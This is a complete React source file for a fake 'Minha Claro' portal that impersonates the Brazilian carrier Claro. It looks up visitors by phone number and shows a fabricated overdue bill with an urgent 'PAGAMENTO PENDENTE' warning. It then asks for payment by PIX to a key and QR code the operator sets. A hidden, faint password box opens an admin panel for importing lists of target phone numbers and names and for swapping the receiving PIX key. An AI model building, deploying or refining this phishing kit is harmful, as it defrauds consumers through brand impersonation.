/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { Phone, ShieldCheck, ChevronRight, AlertCircle, CheckCircle2, QrCode, Copy, Info, LogOut, Zap, ArrowLeft, Settings, Upload, Save, Database } from 'lucide-react';

// Types for our app state
type View = 'login' | 'loading' | 'dashboard' | 'pix' | 'admin';

interface Debtor {
  phone: string;
  name: string;
  value: number;
  due_date: string;
  discount: number;
}

interface PixConfig {
  key: string;
  qrCode: string | null;
}

// Helper to format phone number
const formatarTelefone = (n: string) => {
  const digits = n.replace(/\D/g, '');
  if (digits.length === 0) return "";
  if (digits.length <= 2) return `(${digits}`;
  if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
  return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7, 11)}`;
};

export default function App() {
  const [view, setView] = useState<View>('login');
  const [nextView, setNextView] = useState<View>('dashboard');
  const [phoneInput, setPhoneInput] = useState('');
  const [error, setError] = useState('');
  const [pixCopied, setPixCopied] = useState(false);
  
  // Dynamic Data
  const [debtorData, setDebtorData] = useState<Debtor | null>(null);
  const [pixConfig, setPixConfig] = useState<PixConfig>({ key: 'suachave@pix.com', qrCode: null });
  
  // Admin State
  const [adminPassword, setAdminPassword] = useState('');
  const [isAdminLoggedIn, setIsAdminLoggedIn] = useState(false);
  const [adminDebtors, setAdminDebtors] = useState<Debtor[]>([]);
  const [newPixKey, setNewPixKey] = useState('');
  const [importText, setImportText] = useState('');
  const [adminTab, setAdminTab] = useState('import');

  // Manual Entry State
  const [manualDebtor, setManualDebtor] = useState<Debtor>({
    phone: '',
    name: '',
    value: 0,
    due_date: '',
    discount: 0
  });

  const formattedPhone = formatarTelefone(phoneInput);

  useEffect(() => {
    fetchPixConfig();
  }, []);

  const fetchPixConfig = async () => {
    try {
      const res = await fetch('/api/pix-config');
      const data = await res.json();
      setPixConfig(data);
      setNewPixKey(data.key);
    } catch (err) {
      console.error("Failed to fetch PIX config", err);
    }
  };

  const startLoading = (target: View) => {
    setNextView(target);
    setView('loading');
  };

  useEffect(() => {
    if (view === 'loading') {
      const timer = setTimeout(() => {
        setView(nextView);
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [view, nextView]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    const digits = phoneInput.replace(/\D/g, '');
    if (digits.length < 10) {
      setError('Número incompleto');
      return;
    }

    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: digits })
      });
      const data = await res.json();
      
      if (data.success) {
        setDebtorData(data.debtor);
        setError('');
        startLoading('dashboard');
      } else {
        setError(data.message);
      }
    } catch (err) {
      setError('Erro ao conectar com o servidor.');
    }
  };

  const handleAdminLogin = async () => {
    try {
      const res = await fetch('/api/admin/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ password: adminPassword })
      });
      const data = await res.json();
      if (data.success) {
        setIsAdminLoggedIn(true);
        fetchAdminDebtors();
        setView('admin');
      } else {
        alert(data.message);
      }
    } catch (err) {
      alert('Erro ao conectar com o servidor.');
    }
  };

  const handleTextImport = async () => {
    if (!importText.trim()) return;
    try {
      const rows = importText.split('\n');
      const debtors: Debtor[] = rows
        .filter(row => row.trim())
        .map(row => {
          const columns = row.split(',');
          const phone = columns[0]?.trim() || '';
          const name = columns[1]?.trim() || '';
          const value = parseFloat(columns[2]) || 0;
          const due_date = columns[3]?.trim() || '';
          const discount = parseFloat(columns[4]) || 0;
          return { phone, name, value, due_date, discount };
        })
        .filter(d => d.phone);

      const res = await fetch('/api/admin/debtors', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ debtors })
      });
      if (res.ok) {
        alert('Dados processados com sucesso!');
        setImportText('');
        fetchAdminDebtors();
      }
    } catch (err) {
      alert('Erro no formato! Verifique se usou vírgulas corretamente.');
    }
  };

  const deleteDebtor = async (phone: string) => {
    if (!confirm('Deseja realmente apagar este cliente?')) return;
    try {
      const res = await fetch(`/api/admin/debtors/${phone}`, { method: 'DELETE' });
      if (res.ok) {
        fetchAdminDebtors();
      }
    } catch (err) {
      alert('Erro ao apagar.');
    }
  };

  const handleManualSave = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!manualDebtor.phone || !manualDebtor.name) {
      alert('Preencha ao menos telefone e nome.');
      return;
    }

    try {
      const res = await fetch('/api/admin/debtors', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ debtors: [...adminDebtors, manualDebtor] })
      });
      if (res.ok) {
        alert('Devedor adicionado!');
        setManualDebtor({ phone: '', name: '', value: 0, due_date: '', discount: 0 });
        fetchAdminDebtors();
      }
    } catch (err) {
      alert('Erro ao salvar.');
    }
  };

  const fetchAdminDebtors = async () => {
    const res = await fetch('/api/admin/debtors');
    const data = await res.json();
    setAdminDebtors(data);
  };

  const handleCsvUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = async (event) => {
      const text = event.target?.result as string;
      const rows = text.split('\n').slice(1); // Skip header
      const debtors: Debtor[] = rows
        .filter(row => row.trim())
        .map(row => {
          const columns = row.split(',');
          const phone = columns[0]?.trim() || '';
          const name = columns[1]?.trim() || '';
          const value = parseFloat(columns[2]) || 0;
          const due_date = columns[3]?.trim() || '';
          const discount = parseFloat(columns[4]) || 0;
          return { phone, name, value, due_date, discount };
        })
        .filter(d => d.phone); // Only valid phones

      const res = await fetch('/api/admin/debtors', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ debtors })
      });
      if (res.ok) {
        alert('Lista atualizada!');
        fetchAdminDebtors();
      }
    };
    reader.readAsText(file);
  };

  const handleQrUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = async (event) => {
      const base64 = event.target?.result as string;
      const res = await fetch('/api/admin/pix-config', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ qrCode: base64 })
      });
      if (res.ok) {
        alert('QR Code atualizado!');
        fetchPixConfig();
      }
    };
    reader.readAsDataURL(file);
  };

  const savePixKey = async () => {
    const res = await fetch('/api/admin/pix-config', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key: newPixKey })
    });
    if (res.ok) {
      alert('Chave PIX atualizada!');
      fetchPixConfig();
    }
  };

  const resetSystem = async () => {
    if (!confirm("⚠️ ZONA DE PERIGO: Esta ação apagará todos os clientes cadastrados e todas as configurações de uma vez. Deseja continuar?")) return;
    
    const res = await fetch('/api/admin/reset', { method: 'POST' });
    if (res.ok) {
      alert('O sistema foi resetado com sucesso!');
      fetchAdminDebtors();
      fetchPixConfig();
      setView('login');
    }
  };

  const copyPix = () => {
    navigator.clipboard.writeText(pixConfig.key);
    setPixCopied(true);
    setTimeout(() => setPixCopied(false), 2000);
  };

  return (
    <div className="min-h-screen font-sans flex flex-col items-center justify-center p-4 bg-[#f4f4f7]">
      {/* Admin Sidebar Trigger */}
      <div className="fixed left-4 bottom-4 z-50">
        {!isAdminLoggedIn ? (
          <div className="flex items-center gap-2 bg-white p-2 rounded-lg shadow-sm border border-gray-200 opacity-20 hover:opacity-100 transition-opacity">
            <input 
              type="password" 
              placeholder="Admin" 
              className="text-xs w-20 outline-none"
              value={adminPassword}
              onChange={(e) => setAdminPassword(e.target.value)}
            />
            <button onClick={handleAdminLogin} className="p-1 hover:text-claro-red">
              <Settings className="h-4 w-4" />
            </button>
          </div>
        ) : (
          <button 
            onClick={() => setView('admin')}
            className="p-3 bg-white rounded-full shadow-md border border-gray-200 hover:text-claro-red transition-all"
          >
            <Settings className="h-5 w-5" />
          </button>
        )}
      </div>

      <AnimatePresence mode="wait">
        {view === 'login' && (
          <motion.div
            key="login"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className="w-full max-w-[450px]"
          >
            <div className="bg-white rounded-[20px] shadow-xl p-10 text-center border border-black/5">
              <h1 className="text-claro-red font-black text-[38px] leading-tight mb-1">
                Minha Claro
              </h1>
              <p className="text-gray-600 mb-8">
                Acesse com seu número móvel
              </p>

              <form onSubmit={handleLogin} className="space-y-6 text-left">
                <div>
                  <label className="block text-sm font-semibold text-gray-700 mb-2">
                    Número do Telefone
                  </label>
                  <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                      <Phone className="h-5 w-5 text-gray-400" />
                    </div>
                    <input
                      type="text"
                      value={phoneInput}
                      onChange={(e) => setPhoneInput(formatarTelefone(e.target.value))}
                      placeholder="(00) 00000-0000"
                      className="block w-full pl-10 pr-3 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-claro-red focus:border-transparent transition-all outline-none"
                    />
                  </div>
                </div>

                {error && (
                  <motion.div
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: 'auto' }}
                    className="flex items-center gap-2 text-red-600 bg-red-50 p-3 rounded-lg text-sm font-medium"
                  >
                    <AlertCircle className="h-4 w-4" />
                    {error}
                  </motion.div>
                )}

                <button
                  type="submit"
                  className="w-full bg-claro-red hover:bg-claro-red-hover text-white font-bold h-[60px] rounded-xl transition-all shadow-md flex items-center justify-center gap-2 transform hover:-translate-y-0.5"
                >
                  ACESSAR FATURA
                  <ChevronRight className="h-5 w-5" />
                </button>
              </form>
            </div>
          </motion.div>
        )}

        {view === 'loading' && (
          <motion.div
            key="loading"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="flex flex-col items-center gap-6"
          >
            <div className="h-16 w-16 border-4 border-claro-red/20 border-t-claro-red rounded-full animate-spin" />
            <p className="text-gray-600 font-bold text-lg animate-pulse">Processando...</p>
          </motion.div>
        )}

        {view === 'dashboard' && debtorData && (
          <motion.div
            key="dashboard"
            initial={{ opacity: 0, scale: 0.98 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-[500px] text-center"
          >
            <h1 className="text-claro-red font-black text-[38px] leading-tight mb-6 text-center">
              Minha Claro
            </h1>
            
            <h3 className="text-2xl font-bold text-gray-800 mb-2">
              Bem-vindo, <span className="font-extrabold">{debtorData.name}</span>
            </h3>
            
            <div className="bg-gray-100 p-3 rounded-xl text-gray-700 text-sm mb-8">
              Confira abaixo o débito da linha:<br />
              <span className="font-bold">{debtorData.phone}</span>
            </div>

            <div className="bg-white rounded-2xl shadow-xl border-t-[10px] border-t-claro-red border border-black/5 p-8 text-left mb-8">
              <div className="border-b border-gray-100 pb-4 mb-5">
                <div className="inline-block bg-red-50 text-claro-red px-3 py-1 rounded-full text-xs font-bold mb-4">
                  ⚠️ PAGAMENTO PENDENTE
                </div>
                <p className="text-gray-400 text-xs uppercase tracking-widest font-bold mb-1">Total em aberto</p>
                <p className="text-5xl font-extrabold text-gray-900 leading-none">R$ {(debtorData.value - debtorData.discount).toFixed(2)}</p>
                {debtorData.discount > 0 && (
                  <p className="text-xs text-emerald-600 font-bold mt-2">Desconto aplicado: R$ {debtorData.discount.toFixed(2)}</p>
                )}
              </div>
              
              <div className="flex justify-between text-gray-600 text-sm">
                <div>
                  <span className="font-bold">Referência:</span> Fevereiro/2024
                </div>
                <div>
                  <span className="font-bold">Vencimento:</span> {debtorData.due_date}
                </div>
              </div>
            </div>

            <div className="space-y-4">
              <button
                onClick={() => startLoading('pix')}
                className="w-full bg-pix-green hover:bg-pix-green-hover text-pix-text font-bold h-[60px] rounded-xl transition-all shadow-md flex items-center justify-center gap-2 transform hover:-translate-y-0.5"
              >
                ⚡ GERAR PIX COM DESCONTO
              </button>

              <button
                onClick={() => setView('login')}
                className="w-full text-sm font-bold text-gray-500 hover:text-claro-red transition-colors py-2"
              >
                Sair da conta
              </button>
            </div>
          </motion.div>
        )}

        {view === 'pix' && (
          <motion.div
            key="pix"
            initial={{ opacity: 0, scale: 0.98 }}
            animate={{ opacity: 1, scale: 1 }}
            className="w-full max-w-[500px] text-center"
          >
            <h1 className="text-claro-red font-black text-[38px] leading-tight mb-8">
              Pagamento PIX
            </h1>

            <div className="bg-white rounded-[20px] shadow-xl border border-black/5 p-8 mb-8 space-y-6">
              <div className="bg-emerald-50 border border-emerald-100 p-4 rounded-xl flex items-center justify-center gap-2 text-emerald-800 font-bold">
                <CheckCircle2 className="h-5 w-5" />
                Código PIX gerado com sucesso!
              </div>

              <div className="space-y-4">
                <h3 className="font-bold text-gray-800 text-lg">Escaneie ou copie a chave abaixo:</h3>
                {pixConfig.qrCode && (
                  <div className="flex justify-center bg-gray-50 p-6 rounded-2xl border border-gray-100">
                    <img 
                      src={pixConfig.qrCode} 
                      alt="QR Code PIX" 
                      className="w-64 h-64"
                    />
                  </div>
                )}
              </div>

              <div className="space-y-4">
                <div className="bg-gray-50 p-5 rounded-xl border border-gray-200 font-mono text-xs break-all relative group">
                  {pixConfig.key}
                  <button
                    onClick={copyPix}
                    className="absolute top-3 right-3 p-2 bg-white rounded-lg shadow-sm border border-gray-200 hover:bg-gray-50 transition-all"
                  >
                    {pixCopied ? <CheckCircle2 className="h-4 w-4 text-emerald-500" /> : <Copy className="h-4 w-4 text-gray-500" />}
                  </button>
                </div>
                <button
                  onClick={copyPix}
                  className={`w-full py-4 rounded-xl font-bold transition-all flex items-center justify-center gap-2 shadow-md ${
                    pixCopied 
                      ? 'bg-emerald-500 text-white' 
                      : 'bg-claro-red text-white hover:bg-claro-red-hover'
                  }`}
                >
                  {pixCopied ? (
                    <>
                      <CheckCircle2 className="h-5 w-5" />
                      CÓDIGO COPIADO!
                    </>
                  ) : (
                    <>
                      <Copy className="h-5 w-5" />
                      COPIAR CÓDIGO PIX
                    </>
                  )}
                </button>
              </div>

              <div className="bg-blue-50 border border-blue-100 p-4 rounded-xl text-blue-900 text-sm font-medium flex gap-3 text-left">
                <Info className="h-5 w-5 text-blue-600 shrink-0" />
                Após o pagamento, o sinal será restabelecido em poucos minutos.
              </div>
            </div>

            <button
              onClick={() => setView('dashboard')}
              className="flex items-center justify-center gap-2 w-full text-sm font-bold text-gray-500 hover:text-claro-red transition-colors py-2"
            >
              <ArrowLeft className="h-4 w-4" />
              Voltar
            </button>
          </motion.div>
        )}

        {view === 'admin' && (
          <motion.div
            key="admin"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            className="w-full max-w-[1200px]"
          >
            <div className="flex items-center justify-between mb-6 px-4">
              <h1 className="text-2xl font-bold text-claro-red flex items-center gap-3">
                Gestão Total
              </h1>
              <button 
                onClick={() => setView('login')}
                className="text-sm font-bold text-gray-500 hover:text-claro-red"
              >
                Sair do Admin
              </button>
            </div>

            <div className="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden min-h-[600px]">
              <div className="flex border-b border-gray-100 bg-gray-50/50">
                {['📥 Colar/Importar', '📋 Clientes', '💰 PIX'].map((tab, i) => {
                  const tabKeys = ['import', 'clients', 'pix'];
                  const isActive = adminTab === tabKeys[i];
                  return (
                    <button
                      key={tab}
                      onClick={() => setAdminTab(tabKeys[i])}
                      className={`px-8 py-4 text-sm font-bold transition-all border-b-2 ${
                        isActive
                          ? 'border-claro-red text-claro-red bg-white'
                          : 'border-transparent text-gray-400 hover:text-gray-600'
                      }`}
                    >
                      {tab}
                    </button>
                  );
                })}
              </div>

              <div className="p-6">
                {adminTab === 'import' && (
                  <div className="max-w-3xl mx-auto space-y-6 animate-in fade-in duration-200">
                    <div>
                      <h2 className="text-lg font-bold mb-2">Colar Lista de Devedores</h2>
                      <p className="text-xs text-gray-400 mb-4">Formato: telefone, nome, valor, vencimento, desconto</p>
                      <textarea 
                        className="w-full h-48 p-4 border border-gray-200 rounded-lg outline-none focus:ring-2 focus:ring-claro-red font-mono text-sm bg-gray-50"
                        placeholder="11999998888, João Silva, 89.90, 15/02, 10.00"
                        value={importText}
                        onChange={(e) => setImportText(e.target.value)}
                      />
                      <button 
                        onClick={handleTextImport}
                        className="mt-4 w-full bg-claro-red text-white py-3 rounded-lg font-bold hover:bg-claro-red-hover transition-all shadow-md"
                      >
                        SALVAR LISTA COLADA
                      </button>
                    </div>

                    <div className="pt-6 border-t border-gray-100">
                      <p className="text-sm font-bold text-gray-700 mb-2">Ou Importar CSV</p>
                      <input type="file" accept=".csv" onChange={handleCsvUpload} className="text-xs text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:text-xs file:font-semibold file:bg-red-50 file:text-claro-red hover:file:bg-red-100" />
                    </div>
                  </div>
                )}

                {adminTab === 'clients' && (
                  <div className="animate-in fade-in duration-200">
                    <div className="flex items-center justify-between mb-6">
                      <h2 className="text-lg font-bold">Lista de Clientes</h2>
                      <button 
                        onClick={() => {
                          if(confirm('🚨 APAGAR TUDO?')) {
                            fetch('/api/admin/debtors', {
                              method: 'POST',
                              headers: { 'Content-Type': 'application/json' },
                              body: JSON.stringify({ debtors: [] })
                            }).then(() => fetchAdminDebtors());
                          }
                        }}
                        className="text-xs font-bold text-red-500 hover:bg-red-50 px-3 py-1 rounded-lg transition-colors"
                      >
                        🚨 APAGAR TUDO
                      </button>
                    </div>
                    
                    <div className="space-y-2">
                      {adminDebtors.length === 0 ? (
                        <p className="text-center py-20 text-gray-400 italic">Nenhum cliente cadastrado.</p>
                      ) : (
                        adminDebtors.map((d, i) => (
                          <div key={i} className="flex items-center justify-between p-3 bg-white rounded-lg border border-gray-100 hover:border-gray-200 transition-all shadow-sm">
                            <div className="flex-1 grid grid-cols-3 gap-4 items-center">
                              <span className="font-bold text-gray-800 truncate">{d.name} <span className="font-normal text-gray-400 text-xs ml-2">({d.phone})</span></span>
                              <span className="text-sm text-gray-600 font-medium">R$ {d.value.toFixed(2)}</span>
                              <span className="text-xs text-gray-400">{d.due_date}</span>
                            </div>
                            <button 
                              onClick={() => deleteDebtor(d.phone)}
                              className="p-2 text-gray-300 hover:text-red-500 transition-colors ml-4"
                            >
                              <LogOut className="h-4 w-4 rotate-180" />
                            </button>
                          </div>
                        ))
                      )}
                    </div>
                  </div>
                )}

                {adminTab === 'pix' && (
                  <div className="max-w-xl mx-auto space-y-8 animate-in fade-in duration-200 py-6">
                    <h2 className="text-lg font-bold mb-6">Configuração de Pagamento</h2>

                    <div className="space-y-6">
                      <div>
                        <label className="block text-sm font-semibold text-gray-700 mb-2">Chave PIX</label>
                        <div className="flex gap-2">
                          <input 
                            type="text" 
                            value={newPixKey}
                            onChange={(e) => setNewPixKey(e.target.value)}
                            className="flex-1 px-4 py-2 border border-gray-200 rounded-lg outline-none focus:ring-2 focus:ring-claro-red text-sm"
                          />
                          <button 
                            onClick={savePixKey}
                            className="bg-claro-red text-white px-6 rounded-lg hover:bg-claro-red-hover font-bold text-sm"
                          >
                            SALVAR
                          </button>
                        </div>
                      </div>

                      <div>
                        <p className="text-sm font-semibold text-gray-700 mb-2">Novo QR Code</p>
                        <label className="flex flex-col items-center justify-center w-full h-48 border-2 border-dashed border-gray-200 rounded-xl cursor-pointer hover:bg-gray-50 transition-all overflow-hidden group">
                          {pixConfig.qrCode ? (
                            <div className="relative w-full h-full">
                              <img src={pixConfig.qrCode} className="w-full h-full object-contain" />
                              <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 flex items-center justify-center transition-opacity">
                                <p className="text-white text-xs font-bold">Trocar Imagem</p>
                              </div>
                            </div>
                          ) : (
                            <div className="flex flex-col items-center justify-center pt-5 pb-6">
                              <QrCode className="w-10 h-10 text-gray-300 mb-2" />
                              <p className="text-xs text-gray-400">Clique para subir imagem</p>
                            </div>
                          )}
                          <input type="file" className="hidden" accept="image/*" onChange={handleQrUpload} />
                        </label>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

